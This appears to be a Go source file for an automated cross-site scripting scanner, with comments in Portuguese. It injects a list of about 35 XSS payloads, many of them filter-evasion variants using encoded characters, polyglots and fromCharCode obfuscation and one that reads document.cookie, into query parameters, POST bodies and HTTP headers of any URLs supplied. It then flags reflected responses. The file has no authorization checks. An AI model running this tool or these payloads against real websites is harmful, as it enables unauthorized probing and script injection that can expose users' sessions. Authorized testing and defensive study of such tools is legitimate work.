package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

// Lista de payloads XSS
var payloads = []string{
	`"><sCrIpT>alert("thxnyXSS")</sCrIpT>`,
	`"><svg/onload=setTimeout('al'+'ert("thxnyXSS")')>`,
	`"autofocus/onfocus=eval(String.fromCharCode(97,108,101,114,116,40,49,41))`,
	`"><img src=x onerror=String.fromCharCode(97,108,101,114,116,40,49,41)>`,
	`"><iframe srcdoc='<script>alert("thxnyXSS")</script>'></iframe>`, 
	`"><script>alert("thxnyXSS")</script>`,
	`"><img src=x onerror=alert("thxnyXSS")>`,
	`<svg/onload=alert("thxnyXSS")>`,
	`"><svg/onload=alert("thxnyXSS")>`,
	`'"><script>alert(String.fromCharCode(88,83,83))</script>`,
	`"><iframe src="javascript:alert("thxnyXSS")">`,
	`"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">`,
	`<ScRipT 5-0*3+9/3=>prompt("thxnyXSS")</ScRipT giveanswerhere=?`,
	`"<script>alert("thxnyXSS")</script>"@gmail.com`,
	`#/<script>alert("thxnyXSS")</script>`,
	`<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt1>`,
	"/<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>",
	"<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>",
	`=<img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert%26%23x28;1%26%23x29;>`,
	`<img%20src=x%20onerror="%26%2397%26%23108%26%23101%26%23114%26%23116("thxnyXSS")">`,
	`"><img%20src=x%20onerror="alert(%27POC%20By%20DrakenKun%27)"`,
	"`<ImG%20sRc=x%20onErroR=prompt(ibrahimxss)>",
	`"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;`,
	"<img border=3 alt=jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
	`{{toString.constructor.prototype.charAt=toString.constructor.prototype.substr;alert(toString.constructor.fromCharCode(97,108,101,114,116,40,49,41))}}`,
	"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
	`<input type="text" value="jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"></input>`,
	`<input type='text' value='jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'></input>`,
	`<input type=text value=jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e></input>`,
	`<img border=3 alt=jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/`,
	`oNloAd=alert()//&gt;\x3e`,
	`<a href="jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/ oNloAd=alert()//&gt;,\x3e">click me</a>`,
	`<math xlink:href="jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/ oNloAd=alert()//&gt;\x3e">click me</math>`,
	`<img src=x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">`,
	`<script>eval('al'+'ert("thxnyXSS")')</script>`,
}

// Expressão regular para detectar XSS real
var xssRegex = regexp.MustCompile(`(?i)(<script.*?>.*?</script>|<.*?on\w+\s?=\s?['\"].*?alert\s?\(.*?\).*?['\"].*?>|javascript:\s?alert\s?\(.*?\)|<.*?href\s?=\s?['\"]javascript:.*?alert\s?\(.*?\).*?['\"].*?>|<svg.*?onload\s?=\s?['\"].*?alert\s?\(.*?\).*?['\"].*?>|<img.*?src\s?=\s?x\s?onerror\s?=\s?['\"].*?alert\s?\(.*?\).*?['\"].*?>|<iframe.*?src\s?=\s?['\"]javascript:.*?alert\s?\(.*?\).*?['\"].*?>|document\.location\s?=\s?['\"].*?alert\s?\(.*?\).*?['\"].*?)`)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Uso: go run xss_scanner.go <arquivo_de_urls>")
		os.Exit(1)
	}

	urlFile := os.Args[1]

	// Ler URLs do arquivo
	urls, err := readLines(urlFile)
	if err != nil {
		fmt.Println("Erro ao ler o arquivo de URLs:", err)
		return
	}

	// Testar XSS em cada URL com cada payload
	for _, targetURL := range urls {
		testXSS(targetURL)
	}
}

// Função para ler um arquivo linha por linha
func readLines(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// Função para testar XSS em uma URL
func testXSS(targetURL string) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	// Itera sobre os payloads
	for _, payload := range payloads {
		modifiedURL := injectPayload(parsedURL, payload)
		if modifiedURL == "" {
			continue
		}

		// Teste com GET
		if checkXSS(modifiedURL, "GET", payload, nil) {
			fmt.Println("[+] XSS FOUND (GET):", modifiedURL)
		}

		// Teste com POST
		headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
		postData := "xss=" + url.QueryEscape(payload)
		if checkXSS(targetURL, "POST", payload, headers, postData) {
			fmt.Println("[+] XSS FOUND (POST):", targetURL, "| Payload:", payload)
		}

		// Teste em Headers
		headers = map[string]string{
			"User-Agent": payload,
			"Referer":    payload,
			"X-Forwarded-For": payload,
		}
		if checkXSS(targetURL, "GET", payload, headers) {
			fmt.Println("[+] XSS FOUND (HEADER):", targetURL, "| Payload:", payload)
			for k, v := range headers {
		// Aqui mostramos os headers que foram usados no teste
				fmt.Println("    → Header:", k, "=", v)
		}
	}

		// Pequeno delay para evitar bloqueios
		time.Sleep(500 * time.Millisecond)
	}
}

// Função para injetar o payload na URL
func injectPayload(parsedURL *url.URL, payload string) string {
	queryParams := parsedURL.Query()

	// Modifica apenas URLs com parâmetros
	if len(queryParams) == 0 {
		return ""
	}

	// Substitui valores dos parâmetros pelo payload
	for param := range queryParams {
		queryParams.Set(param, payload)
	}

	parsedURL.RawQuery = queryParams.Encode()
	return parsedURL.String()
}

// Função para verificar XSS com diferentes métodos e headers
func checkXSS(targetURL, method, payload string, headers map[string]string, body ...string) bool {
	var req *http.Request
	var err error

	if method == "POST" && len(body) > 0 {
		req, err = http.NewRequest("POST", targetURL, strings.NewReader(body[0]))
	} else {
		req, err = http.NewRequest(method, targetURL, nil)
	}

	if err != nil {
		return false
	}

	// Adiciona headers customizados
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Lê o corpo da resposta
	bodyContent, _ := ioutil.ReadAll(resp.Body)
	responseStr := string(bodyContent)
     	
     	if strings.Contains(responseStr, payload){
	// Verifica se o payload retorna de forma executável
		return xssRegex.MatchString(responseStr)
	}
	return false
}

